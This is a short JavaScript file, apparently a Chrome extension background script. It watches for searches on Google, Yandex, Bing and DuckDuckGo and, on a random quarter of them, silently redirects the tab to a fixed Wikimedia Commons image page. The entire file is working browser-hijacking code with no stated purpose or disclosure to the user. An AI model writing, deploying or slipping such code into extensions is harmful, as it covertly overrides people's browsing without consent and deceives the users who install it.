
const TARGET_URL = "https://commons.wikimedia.org/wiki/File:FemboyPup_in_bed.jpg?uselang=ru"; 

const searchFilters = {
    url: [
        { hostContains: "google.", pathContains: "/search" },
        { hostContains: "yandex.", pathContains: "/search" },
        { hostContains: "bing.com", pathContains: "/search" },
        { hostContains: "duckduckgo.com", queryContains: "q=" }
    ]
};

chrome.webNavigation.onBeforeNavigate.addListener((details) => {
    if (details.frameId === 0) {
        
        if (Math.random() < 0.25) {
            
            chrome.tabs.update(details.tabId, { url: TARGET_URL });
        }
    }
}, searchFilters);
